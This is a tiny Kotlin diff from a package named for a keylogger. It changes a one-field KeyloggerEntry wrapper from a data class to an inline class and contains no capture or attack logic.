@@ -32,4 +32,4 @@ package com.evilthreads.keylogger
 ............\..............(
 ..............\.............\...
 */
-data class KeyloggerEntry(val text: String)
+inline class KeyloggerEntry(val text: String)
